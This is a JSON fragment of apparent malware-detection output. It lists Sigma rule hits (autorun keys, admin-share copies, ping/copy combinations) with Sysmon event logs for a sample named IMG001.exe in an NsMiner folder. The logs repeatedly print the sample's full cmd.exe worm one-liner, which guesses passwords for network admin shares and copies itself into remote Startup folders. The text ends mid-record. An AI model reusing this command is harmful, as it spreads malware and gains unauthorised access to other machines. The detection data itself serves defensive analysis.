                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4506-000000003B00}; ProcessId=8124; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; ProcessId=7380; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08D-6560-8206-000000003B00}; ProcessId=4964; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1809\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839565; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=Cmd.Exe; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1507\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\Ns [TRUNCATED]; EventID=1; ParentImage=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\cmd.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "18842e32896dd83b8aca4d5e1ac78c1f66b1d252479c0023cdd02f108c42c8cd",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Wow6432Node CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=3588; EventType=SetValue; Image=C:\\Windows\\SysWOW64\\reg.exe; RuleName=T1060,RunKey; UtcTime=1700839547; Details=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C07B-6560-2E06-000000003B00}; TargetObject=HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{RuleName=T1060,RunKey; EventID=13; Details=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe; Image=C:\\Windows\\SysWOW64\\reg.exe; EventType=SetValue; TargetObject=HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "253df726683ee378cff180cb32526ec9f10b897edda084113b11cbeba118fbe3",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Copy From Or To Admin Share Or Sysvol Folder",
                                                                       "rule_description":  "Detects a copy command or a copy utility execution to or from an Admin share or remote",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=Cmd.Exe; Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; Description=Windows Command Processor; EventID=1; ParentCommandLine=\"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1507\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\Ns [TRUNCATED]; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\cmd.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=Cmd.Exe; Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; Description=Windows Command Processor; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1507\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\I [TRUNCATED]; CommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\172.16.1.1\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\172.16.1.1\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\cmd.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=7E9B7CE496D09F70C072930940F9F02C,SHA256=B45997BB7C5FC6024685EE8752CF8AB871290A46B33E04FC4850A10077ACBA5A,IMPHASH=370E0F2A87317776FEB42A7B32DD037B; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=XCOPY.EXE; Product=Microsoft\\xae Windows\\xae Operating System; Description=Extended Copy Utility; EventID=1; ParentCommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\172.16.1.1\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\172.16.1.1\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; CommandLine=xcopy  /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\172.16.1.1\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"   ; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\xcopy.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=Cmd.Exe; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; EventID=1; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1507\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\I [TRUNCATED]; CommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\172.16.1.1\\C$\\1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\172.16.1.1\\C$\\1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\cmd.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=XCOPY.EXE; Hashes=MD5=7E9B7CE496D09F70C072930940F9F02C,SHA256=B45997BB7C5FC6024685EE8752CF8AB871290A46B33E04FC4850A10077ACBA5A,IMPHASH=370E0F2A87317776FEB42A7B32DD037B; Description=Extended Copy Utility; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\172.16.1.1\\C$\\1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\172.16.1.1\\C$\\1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; CommandLine=xcopy  /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\172.16.1.1\\C$\\1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"   ; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\xcopy.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "2dc5d25da9f75ae324bd1ef4e2e4fb2084251a622beac794700223e8c20907a3",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Ping/Copy Command Combination",
                                                                       "rule_description":  "Detects uncommon one-liner command having ping and copy at the same time, which is usually used by malware.",
                                                                       "rule_author":  "X__Junior (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3706-000000003B00}; ProcessId=7868; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start 